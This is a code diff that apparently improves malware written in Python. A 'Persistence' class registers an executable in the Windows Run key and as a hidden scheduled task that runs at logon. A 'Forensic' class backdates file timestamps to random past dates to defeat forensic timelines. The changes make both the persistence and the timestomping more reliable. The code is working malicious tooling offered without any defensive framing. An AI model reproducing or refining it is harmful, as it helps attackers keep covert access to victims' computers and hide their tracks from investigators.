@@ -93,18 +93,26 @@ class Persistence:
     def _check_reg(self):
         try:
             import winreg
-            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
-                r'Software\Microsoft\Windows\CurrentVersion\Run', 0,
-                winreg.KEY_READ | winreg.KEY_WOW64_64KEY)
-            val, _ = winreg.QueryValueEx(k, _REG_KEY)
-            winreg.CloseKey(k)
-            return val == self.exe
+            k = None
+            try:
+                for flags in [winreg.KEY_READ | winreg.KEY_WOW64_64KEY, winreg.KEY_READ]:
+                    try:
+                        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                            r'Software\Microsoft\Windows\CurrentVersion\Run', 0, flags)
+                        val, _ = winreg.QueryValueEx(k, _REG_KEY)
+                        winreg.CloseKey(k)
+                        return val == self.exe
+                    except:
+                        if k: winreg.CloseKey(k); k = None
+                        continue
+            finally:
+                if k: winreg.CloseKey(k)
         except: return False
 
     def _task(self):
         try:
             cf = subprocess.CREATE_NO_WINDOW if hasattr(subprocess,'CREATE_NO_WINDOW') else 0
-            subprocess.run(f'schtasks /create /tn "{_TASK_NAME}" /tr "\\"{self.exe}\\"" /sc ONLOGON /rl LIMITED /f /it',
+            subprocess.run(f'schtasks /create /tn "{_TASK_NAME}" /tr "\"{self.exe}\"" /sc ONLOGON /rl LIMITED /f /it',
                 shell=True, capture_output=True, creationflags=cf)
             return True
         except: return False
@@ -221,13 +229,15 @@ class Forensic:
         try:
             now = time.time()
             hours = random.randint(720, 4320)
-            ft_ns = int((now - hours * 3600) * 10000000) + 116444736000000000
+            t_create = int((now - hours * 3600) * 10000000) + 116444736000000000
+            t_access = t_create + random.randint(600, 1800) * 10000000
+            t_write  = t_access + random.randint(300, 3600) * 10000000
             h = ctypes.windll.kernel32.CreateFileW(p, 0x100|0x80, 0, None, 3, 0x80, None)
             if h and h != -1:
                 ctypes.windll.kernel32.SetFileTime(h,
-                    ctypes.byref(ctypes.c_ulonglong(ft_ns)),
-                    ctypes.byref(ctypes.c_ulonglong(ft_ns + random.randint(100,3600)*10000000)),
-                    ctypes.byref(ctypes.c_ulonglong(ft_ns + random.randint(200,7200)*10000000)))
+                    ctypes.byref(ctypes.c_ulonglong(t_create)),
+                    ctypes.byref(ctypes.c_ulonglong(t_access)),
+                    ctypes.byref(ctypes.c_ulonglong(t_write)))
                 ctypes.windll.kernel32.CloseHandle(h)
         except: pass
 
